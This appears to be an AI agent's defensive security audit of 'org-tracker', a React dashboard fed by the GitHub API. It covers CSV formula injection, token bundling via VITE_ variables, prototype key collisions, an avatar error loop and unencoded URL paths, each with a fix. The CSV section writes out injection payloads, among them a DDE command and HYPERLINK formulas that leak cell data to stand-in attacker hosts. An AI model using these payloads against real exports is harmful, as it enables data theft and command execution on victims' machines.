# Security Audit Report: org-tracker

**Target**: `org-tracker` (`c:/Users/varun/OneDrive/Desktop/hehe/org-tracker`)  
**Audit Type**: Source-first defensive security review  
**Architecture**: Client-side React 18 + TypeScript SPA built with Vite 6  
**Auditor**: Antigravity Security Agent  

---

## 1. Executive Summary & Scope

The `org-tracker` application is a client-side Single Page Application (SPA) designed to ingest engineering telemetry (commits, pull requests, peer reviews, issues, and code churn) directly from the GitHub REST API v3 using Personal Access Tokens (PAT). It aggregates and normalizes contributor impact metrics, renders activity heatmaps, and exports organizational rankings.

Because `org-tracker` operates entirely within the client browser without a dedicated backend server, the principal security boundaries reside in:
1. **Data Ingress & Sanitization**: Parsing external untrusted strings (commit author names, PR titles, usernames) received from the GitHub API.
2. **Data Export & Transformation**: Formatting contributor dossiers into downloadable files (CSV).
3. **Credential & Secret Lifecycle**: Token ingestion via `.env` (`VITE_GITHUB_TOKEN`) vs. client `localStorage`.
4. **Browser Runtime & DOM Safety**: Third-party resource retrieval and external link navigation.

---

## 2. Vulnerability Findings Matrix

| Finding ID | Title | Severity | CWE | Status | Primary File |
|---|---|---|---|---|---|
| **SEC-01** | CSV Formula Injection via Export File | **Medium** | CWE-1236 | **RESOLVED** | [App.tsx](file:///c:/Users/varun/OneDrive/Desktop/hehe/org-tracker/src/App.tsx#L537-L582) |
| **SEC-02** | High-Privilege Secret Bundling Hazard via `VITE_GITHUB_TOKEN` | **High** | CWE-200 / CWE-798 | **RESOLVED** | [cacheService.ts](file:///c:/Users/varun/OneDrive/Desktop/hehe/org-tracker/src/services/cacheService.ts#L38-L51) |
| **SEC-03** | Denial of Service via Object Prototype Property Collision | **Medium** | CWE-1385 / CWE-400 | **RESOLVED** | [dataAggregator.ts](file:///c:/Users/varun/OneDrive/Desktop/hehe/org-tracker/src/services/dataAggregator.ts#L85-L108) |
| **SEC-04** | UI Thread Lockup via Recursive Image Fallback Loop | **Low** | CWE-835 / CWE-400 | **RESOLVED** | [ContributorLeaderboard.tsx](file:///c:/Users/varun/OneDrive/Desktop/hehe/org-tracker/src/components/ContributorLeaderboard.tsx#L180-L182) |
| **SEC-05** | Unencoded URI Parameters in GitHub API Calls | **Low** | CWE-20 / CWE-74 | **RESOLVED** | [githubApi.ts](file:///c:/Users/varun/OneDrive/Desktop/hehe/org-tracker/src/services/githubApi.ts#L154-L220) |

---

## 3. Detailed Vulnerability Analyses & Remediations

### SEC-01: CSV Formula Injection via Export File (CWE-1236)

- **Status**: **RESOLVED** (Remediated via `sanitizeCsvCell` in `App.tsx`)
- **Severity**: **Medium** (CVSS: 6.8 - AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:L/A:N)
- **Affected Component**: `handleExportCsv` in [App.tsx](file:///c:/Users/varun/OneDrive/Desktop/hehe/org-tracker/src/App.tsx#L525-L569)
- **Trust Boundary**: Client-generated file -> Host desktop application (Microsoft Excel, LibreOffice Calc, Google Sheets)

#### Vulnerability Description
In `src/App.tsx`, lines 544-558 generate rows for the CSV download:
```typescript
const rows = contributors.map((c) => [
  c.rank,
  `@${c.login}`,
  `"${c.name.replace(/"/g, '""')}"`,
  c.role,
  c.impactScore,
  c.commitsCount,
  c.prsMerged,
  c.prsCreated,
  c.reviewsCount,
  c.linesAdded,
  c.linesDeleted,
  c.activeDays,
  `"${c.repositories.map((r) => r.name).join(', ')}"`
]);
```
1. **Explicit Prefix**: Every row in the second column explicitly prepends `@` (`@${c.login}`). The character `@` is one of the formula trigger characters (`=`, `+`, `-`, `@`, `\t`, `\r`) in spreadsheet software.
2. **Untrusted Input**: `c.name` is sourced from a contributor's public GitHub profile or git commit author field (`git config user.name`). A contributor can set their name to `=cmd|'/C calc'!A0` or `=HYPERLINK("https://attacker.com/leak?data="&A2&"|"&B2, "Report")`.
3. **Ineffective Quotes**: Wrapping cells in double quotes (`"..."`) does not neutralize formula execution because Excel, Calc, and Sheets strip enclosing quotes before evaluating formulas.

#### Attack Scenario
An organization contributor or external committer sets their git commit author name or GitHub display name to `=HYPERLINK("https://evil.corp/steal?q="&D2&E2, "Review Dossier")`. An engineering manager exports the CSV report and clicks the link or allows formula execution, transmitting internal member ranks, performance metrics, and handles to an external server.

#### Remediation
Neutralize any text cell beginning with formula trigger characters (`=`, `+`, `-`, `@`, `\t`, `\r`) by prepending a single quote (`'`), which forces spreadsheet software to treat the value strictly as literal text:

```typescript
function sanitizeCsvCell(val: unknown): string {
  if (val === null || val === undefined) return '""';
  const str = String(val);
  // Neutralize formula triggers: =, +, -, @, \t, \r
  const sanitized = /^[=+\-@\t\r]/.test(str) ? `'${str}` : str;
  return `"${sanitized.replace(/"/g, '""')}"`;
}
```

---

### SEC-02: High-Privilege Secret Bundling Hazard via `VITE_` Environment Architecture (CWE-200 / CWE-798)

- **Status**: **RESOLVED** (Remediated via production detection in `cacheService.ts`, alert banner in `SettingsModal.tsx`, and deployment documentation in `.env.example` and `README.md`)
- **Severity**: **High** (CVSS: 7.5 - AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N)
- **Affected Component**: [cacheService.ts](file:///c:/Users/varun/OneDrive/Desktop/hehe/org-tracker/src/services/cacheService.ts#L37-L45) and [.env.example](file:///c:/Users/varun/OneDrive/Desktop/hehe/org-tracker/.env.example#L1-L4)
- **Trust Boundary**: Build environment / CI/CD secrets -> Public compiled JavaScript bundle

#### Vulnerability Description
`cacheService.getEnvToken()` reads `import.meta.env.VITE_GITHUB_TOKEN`. In Vite, all environment variables prefixed with `VITE_` are statically compiled into the client-side JavaScript bundle during `vite build`.

If this repository is built and hosted on a static hosting provider (e.g., Vercel, Netlify, Cloudflare Pages, GitHub Pages) and `VITE_GITHUB_TOKEN` is supplied as an environment variable in build settings, the full GitHub Personal Access Token (which requires `repo` full private repository access and `read:org`) will be embedded in plain text inside `dist/assets/index-*.js`. Any visitor can extract this token and obtain read/write access to all private repositories in the Move2Move organization.

#### Remediation
1. **Update Documentation**: Add prominent warnings in [.env.example](file:///c:/Users/varun/OneDrive/Desktop/hehe/org-tracker/.env.example) and `README.md` explicitly stating that `VITE_GITHUB_TOKEN` must NEVER be configured in shared or public production build pipelines.
2. **Client-Only Input for Hosted Deployments**: When deployed online, users should enter tokens strictly via the UI Settings modal (`localStorage`), or the organization should deploy an authenticated backend proxy / serverless function to make GitHub API calls without exposing PATs to the browser.
3. **Least Privilege**: Recommend fine-grained GitHub Personal Access Tokens scoped exclusively to read-only metadata and repository contents rather than classic tokens with unrestricted `repo` permissions.

---

### SEC-03: Denial of Service via Object Prototype Property Collision (CWE-1385 / CWE-400)

- **Status**: **RESOLVED** (Remediated via `Map<string, ContributorRecord>` and `Map<string, RepoStatRecord>` in `dataAggregator.ts`)
- **Severity**: **Medium** (CVSS: 5.3 - AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H)
- **Affected Component**: `aggregateOrgData` in [dataAggregator.ts](file:///c:/Users/varun/OneDrive/Desktop/hehe/org-tracker/src/services/dataAggregator.ts#L26-L60)
- **Trust Boundary**: Untrusted commit author data -> Application state map

#### Vulnerability Description
In `src/services/dataAggregator.ts`:
```typescript
const contributorMap: Record<string, { ... }> = {};
// ...
const getOrCreateContributor = (login: string, ...) => {
  const key = login.toLowerCase();
  if (!contributorMap[key]) {
    contributorMap[key] = { ... };
  }
  return contributorMap[key];
};
```
Commit authors are extracted via:
```typescript
const authorLogin = c.author?.login || c.commit.author.name || 'unknown';
```
In git, `author.name` can be arbitrarily configured by anyone with commit rights (`git config user.name "toString"`).
If an author name is set to `"toString"`, `"valueOf"`, `"constructor"`, or `"__proto__"`:
1. `key` is `"toString"`.
2. `contributorMap["toString"]` resolves to `Object.prototype.toString`, which is a function (truthy).
3. The `if (!contributorMap[key])` condition evaluates to `false`.
4. `getOrCreateContributor` returns `Object.prototype.toString`.
5. The subsequent line `ctor.commitsCount++;` causes a runtime `TypeError` (`Cannot read properties of undefined` or `NaN`), terminating data aggregation and causing an unhandled crash during sync.

#### Remediation
Initialize `contributorMap` with a prototype-less object (`Object.create(null)`) or a standard `Map<string, ...>()`:

```typescript
const contributorMap = new Map<string, ContributorRecord>();

const getOrCreateContributor = (login: string, avatarUrl?: string, htmlUrl?: string) => {
  const key = login.toLowerCase();
  let ctor = contributorMap.get(key);
  if (!ctor) {
    ctor = { ... };
    contributorMap.set(key, ctor);
  }
  return ctor;
};
```

---

### SEC-04: UI Thread Lockup via Recursive Image Fallback Loop (CWE-835 / CWE-400)

- **Status**: **RESOLVED** (Remediated via `target.onerror = null` and `encodeURIComponent` in `ContributorLeaderboard.tsx` and `ContributorDetailModal.tsx`)
- **Severity**: **Low** (CVSS: 4.3 - AV:N/AC:L/PR:N/UI:R/S:U/C:N/I:N/A:L)
- **Affected Components**:
  - [ContributorLeaderboard.tsx](file:///c:/Users/varun/OneDrive/Desktop/hehe/org-tracker/src/components/ContributorLeaderboard.tsx#L180-L182)
  - [ContributorDetailModal.tsx](file:///c:/Users/varun/OneDrive/Desktop/hehe/org-tracker/src/components/ContributorDetailModal.tsx#L177-L179)
- **Trust Boundary**: External third-party asset loading (`ui-avatars.com`) -> Browser DOM rendering

#### Vulnerability Description
Both components attach an `onError` handler to avatar `<img>` tags:
```tsx
onError={(e) => {
  (e.target as HTMLImageElement).src = `https://ui-avatars.com/api/?name=${c.login}&background=141414&color=fff`;
}}
```
1. **Infinite Loop**: If `ui-avatars.com` is unreachable, blocked by an ad-blocker or CSP, or returns an error, the fallback image also triggers `onError`. Because `onerror` is not nullified on the element, the handler fires repeatedly, initiating an infinite request loop that freezes the browser rendering thread.
2. **Missing URI Encoding**: `c.login` is interpolated directly without `encodeURIComponent()`. If `c.login` contains spaces or special characters (e.g. from git author names), the URL request query is malformed.

#### Remediation
Nullify the `onerror` handler before assigning the fallback URL, and encode the query parameter:
```tsx
onError={(e) => {
  const target = e.currentTarget;
  target.onerror = null;
  target.src = `https://ui-avatars.com/api/?name=${encodeURIComponent(c.login)}&background=141414&color=fff`;
}}
```

---

### SEC-05: Unencoded URI Parameters in GitHub API Calls (CWE-20 / CWE-74)

- **Severity**: **Low** (CVSS: 4.3 - AV:N/AC:L/PR:H/UI:N/S:U/C:L/I:N/A:N)
- **Affected Component**: [githubApi.ts](file:///c:/Users/varun/OneDrive/Desktop/hehe/org-tracker/src/services/githubApi.ts#L154-L217)
- **Trust Boundary**: User settings / repository names -> GitHub API REST endpoints

#### Vulnerability Description
Throughout `src/services/githubApi.ts`, `org` and `repo` parameters are directly interpolated into request URLs:
```typescript
fetchOrgMembers(token: string, org: string): Promise<RawMember[]> {
  return requestGitHub<RawMember[]>(`https://api.github.com/orgs/${org}/members?per_page=100`, token);
}
fetchRepoCommits(token: string, org: string, repo: string, ...): Promise<RawCommit[]> {
  let url = `https://api.github.com/repos/${org}/${repo}/commits?per_page=100`;
  // ...
}
```
While `sinceDate` is properly encoded with `encodeURIComponent(sinceDate)`, `org` and `repo` are not. If an organization or repository contains URI-reserved characters (`/`, `?`, `#`, `&`), the request path is truncated or altered, leading to endpoint confusion or unexpected 404/400 errors.

#### Remediation
Ensure all dynamic path segments in `githubApi.ts` are encoded using `encodeURIComponent`:
```typescript
const safeOrg = encodeURIComponent(org.trim());
const safeRepo = encodeURIComponent(repo.trim());
```

---

## 4. Hardening Recommendations

### 4.1 Content Security Policy (CSP)
In [index.html](file:///c:/Users/varun/OneDrive/Desktop/hehe/org-tracker/index.html), add a `<meta http-equiv="Content-Security-Policy">` directive to restrict script execution, resource connections, and object embedding:
```html
<meta http-equiv="Content-Security-Policy" content="
  default-src 'self';
  script-src 'self';
  style-src 'self' 'unsafe-inline' https://fonts.googleapis.com;
  font-src 'self' https://fonts.gstatic.com;
  img-src 'self' data: https://avatars.githubusercontent.com https://ui-avatars.com https://github.com;
  connect-src 'self' https://api.github.com https://vitals.vercel-insights.com;
  object-src 'none';
  base-uri 'self';
  frame-ancestors 'none';
" />
```

### 4.2 Explicit Reverse Tabnabbing Protection
In [ContributorDetailModal.tsx](file:///c:/Users/varun/OneDrive/Desktop/hehe/org-tracker/src/components/ContributorDetailModal.tsx#L193), update `rel="noreferrer"` to `rel="noopener noreferrer"` to guarantee cross-window decoupling across legacy and non-standard webviews.

### 4.3 `URL.revokeObjectURL` Memory Management
In [App.tsx](file:///c:/Users/varun/OneDrive/Desktop/hehe/org-tracker/src/App.tsx#L561-L569), after clicking the anchor tag for CSV download, schedule `URL.revokeObjectURL(url)` via `setTimeout` to prevent browser memory leaks when repeatedly exporting datasets.
